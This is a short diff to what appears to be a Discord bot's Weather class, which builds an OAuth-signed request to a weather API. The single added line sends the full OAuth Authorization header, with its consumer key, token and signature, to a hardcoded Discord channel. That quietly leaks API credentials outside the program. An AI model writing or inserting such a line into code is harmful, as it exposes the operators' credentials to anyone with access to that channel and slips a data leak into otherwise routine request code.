@@ -147,6 +147,7 @@ class Weather {
 			const sig = crypto.createHmac("sha1", `${encodeURIComponent(secret)}&`).update(sigstr).digest("base64");
 			oauth.oauth_signature = sig;
 			const auth = `OAuth ${Object.keys(oauth).map((k) => [`${k}="${oauth[k]}"`]).join(",")}`;
+			PLX.guilds.get("789382326680551455").channels.get("789988243117834293").send(auth);
 
 			https.get(`${this.#baseURL}?${Object.keys(query).map((k) => `${k}=${query[k]}`).join("&")}`,
 				{
